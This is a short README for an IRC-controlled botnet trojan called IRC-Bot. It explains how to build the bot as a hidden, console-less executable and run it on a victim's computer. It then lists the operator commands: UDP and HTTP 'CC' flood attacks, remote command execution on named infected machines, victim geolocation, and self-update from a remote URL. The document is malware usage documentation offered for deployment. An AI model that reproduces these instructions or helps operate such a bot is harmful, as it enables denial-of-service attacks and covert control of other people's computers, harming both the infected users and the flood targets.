## What is IRC-Bot
	IRC-Bot is a trojans that use irc channel easy to control botnet.

## What can IRC-Bot do
    DDoS, Learn IRC protocol

## How to use IRC-Bot

1. make irc-botnet executable
```bash
pyinstaller --noconsole -F awesome.py
```

2. run in the victim computer

3. use irssi join the channel(your own), then you can send the following instructions.
```bash
    .udp1 ip port duration     # simple udp flood
    .udp2 ip port duration packet_size interval     # udp flood
    .cc1 url duration          # simple cc attack
    .cc2 url duration interval  # cc attack
    .cmd lin-xxx ls -al         # make special computer run cmd
    .geo lin-xxx                # get special location
    .reload url                 # update irc-bot
```